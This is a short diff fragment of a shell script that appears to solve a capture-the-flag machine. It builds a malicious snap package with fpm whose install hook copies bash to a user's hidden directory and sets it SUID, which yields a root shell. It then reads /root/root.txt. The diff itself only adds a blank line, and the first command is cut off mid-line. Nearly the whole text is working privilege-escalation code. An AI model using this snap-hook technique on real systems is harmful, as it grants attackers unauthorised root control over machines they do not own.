@@ -10,3 +10,4 @@ printf '#!/bin/sh\ncp /bin/bash /home/brucetherealadmin/.w/rootbash && chmod +s 
 chmod +x meta/hooks/install
 fpm -n waza -s dir -t snap -a all meta
 cat /root/root.txt
+
